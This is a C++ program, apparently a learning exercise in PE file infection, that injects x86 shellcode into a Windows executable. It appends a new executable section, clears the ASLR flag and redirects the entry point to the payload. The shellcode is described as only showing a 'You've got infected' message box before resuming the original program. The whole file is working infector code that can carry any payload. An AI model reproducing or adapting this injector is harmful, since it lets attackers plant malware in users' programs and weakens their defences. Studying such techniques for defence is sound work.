#include <iostream>
#include <fstream>
#include <Windows.h>

BYTE shellcode[] = {
    "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
    "\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
    "\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
    "\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
    "\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
    "\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
    "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
    "\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
    "\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
    "\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
    "\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
    "\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
    "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
    "\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
    "\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
    "\x74\x65\x64\x00\x68\x6e\x66\x65\x63\x68"
    "\x6f\x74\x20\x69\x68\x76\x65\x20\x67\x68"
    "\x59\x6f\x75\x27\x8b\xcc\x57\x57\x51\x57"
    "\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
    "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
    "\x69\x74\x54\x53\xff\xd6\x68\xa0\x99\x44"
    "\x00\xc3" 
// This shellcode will pops up "You've got infected" message
// After the user clicks OK button, it jumps back to the OriginalEntryPoint (which at 0x4499A0)
// and the original program will run back to normal
};

void printErrorMessage(const std::string& message) {
    std::cerr << message << std::endl;
}

bool readAndInjectShellcode(const wchar_t* filePath) {
    HANDLE fileHandle = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        printErrorMessage("Failed to open file");
        return false;
    }

    DWORD fileSize = GetFileSize(fileHandle, nullptr);
    if (fileSize == INVALID_FILE_SIZE) {
        printErrorMessage("Failed to get file size");
        CloseHandle(fileHandle);
        return false;
    }

    BYTE* fileBuffer = new BYTE[fileSize];
    if (fileBuffer == nullptr) {
        printErrorMessage("Failed to allocate memory");
        CloseHandle(fileHandle);
        return false;
    }

    DWORD bytesRead;
    if (!ReadFile(fileHandle, fileBuffer, fileSize, &bytesRead, nullptr)) {
        printErrorMessage("Failed to read file");
        delete[] fileBuffer;
        CloseHandle(fileHandle);
        return false;
    }
	IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)(fileBuffer);
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);
	PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
	DWORD ret = SetFilePointer(fileHandle, dosHeader->e_lfanew, NULL, FILE_BEGIN);
	DWORD newCharacteristics;
	DWORD offsetToDllCharacteristics = ret + 4 + sizeof(IMAGE_FILE_HEADER) + offsetof(IMAGE_OPTIONAL_HEADER32, DllCharacteristics);

	if (ret != INVALID_SET_FILE_POINTER) {

		// Get the address of the last section
		IMAGE_SECTION_HEADER lastSection = sectionHeader[ntHeader->FileHeader.NumberOfSections - 1];

		// Get the size of the code and RVA of the new section
		DWORD fileAlignment = ntHeader->OptionalHeader.FileAlignment;
		DWORD sectionAlignment = ntHeader->OptionalHeader.SectionAlignment;
		DWORD sizeOfImage = ntHeader->OptionalHeader.SizeOfImage;
		DWORD newSectionVirtualAddress = lastSection.VirtualAddress + (lastSection.Misc.VirtualSize + (sectionAlignment - 1) & ~(sectionAlignment - 1));
		size_t codeSize = sizeof(shellcode);

		// Create new section
		IMAGE_SECTION_HEADER newSection = {};
		auto isize = sizeof(newSection.Name);
		strncpy_s(reinterpret_cast<char*>(newSection.Name), isize, ".abc", sizeof(".abc"));
		newSection.Misc.VirtualSize = codeSize; // Total size of the section when loaded into the memory
		newSection.SizeOfRawData = (codeSize + (fileAlignment - 1) & ~(fileAlignment - 1)); // Size of the section's initialized data on disk
		newSection.PointerToRawData = lastSection.PointerToRawData + lastSection.SizeOfRawData;
		newSection.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;
		newSection.VirtualAddress = newSectionVirtualAddress;

		// Add new section information to section header
		SetFilePointer(fileHandle, ret + sizeof(IMAGE_NT_HEADERS) + ntHeader->FileHeader.NumberOfSections * 40, NULL, FILE_BEGIN);
		WriteFile(fileHandle, &newSection, sizeof(newSection), NULL, NULL);

		// Update the number of section existed within the file
		ntHeader->FileHeader.NumberOfSections++;
		SetFilePointer(fileHandle, ret + 6, NULL, FILE_BEGIN);
		WriteFile(fileHandle, &ntHeader->FileHeader.NumberOfSections, sizeof(DWORD), NULL, NULL);

		// Inject the shellcode
		SetFilePointer(fileHandle, newSection.PointerToRawData, NULL, FILE_BEGIN);
		WriteFile(fileHandle, shellcode, codeSize, NULL, NULL);

		// Turn off DLL can move flag
		SetFilePointer(fileHandle, offsetToDllCharacteristics, NULL, FILE_BEGIN);
		BOOL readDllCharacteristics = ReadFile(fileHandle, &newCharacteristics, sizeof(newCharacteristics), &bytesRead, NULL);
		if (!readDllCharacteristics) {
			printErrorMessage("Failed to read DllCharacteristics");
			CloseHandle(fileHandle);
			delete[] fileBuffer;
			return 1;
		}
		newCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;

		// Write the modified DllCharacteristics field back to the file
		SetFilePointer(fileHandle, -static_cast<LONG>(sizeof(newCharacteristics)), NULL, FILE_CURRENT);
		WriteFile(fileHandle, &newCharacteristics, sizeof(newCharacteristics), &bytesRead, NULL);

		// Recalculate the SizeOfImage and roundit up with SectionAlignment
		sizeOfImage = sizeOfImage + codeSize + (sectionAlignment - 1) & ~(sectionAlignment - 1);
		SetFilePointer(fileHandle, ret + 4 + sizeof(IMAGE_FILE_HEADER) + offsetof(IMAGE_OPTIONAL_HEADER32,SizeOfImage), NULL, FILE_BEGIN);
		WriteFile(fileHandle, &sizeOfImage, sizeof(DWORD), NULL, NULL);
		SetFilePointer(fileHandle, newSection.PointerToRawData + newSection.SizeOfRawData, NULL, FILE_BEGIN);
		SetEndOfFile(fileHandle);

		// Adjust the AddressOfEntryPoint to point to the new section
		ntHeader->OptionalHeader.AddressOfEntryPoint = newSectionVirtualAddress;
		SetFilePointer(fileHandle, ret + 40, NULL, FILE_BEGIN);
		WriteFile(fileHandle, &newSectionVirtualAddress, sizeof(DWORD), NULL, NULL);

	}
	else {
		printErrorMessage("Failed to read PE Header");
	}

    delete[] fileBuffer;
    CloseHandle(fileHandle);
    return true;
}

int main() {
    const wchar_t* filePath = L"C:\\Users\\Avenger\\Desktop\\DXCpl - Copy.exe";

    if (readAndInjectShellcode(filePath)) {
        std::cout << "Shellcode injected successfully" << std::endl;
        return 0;
    }
    else {
        return 1;
    }
}
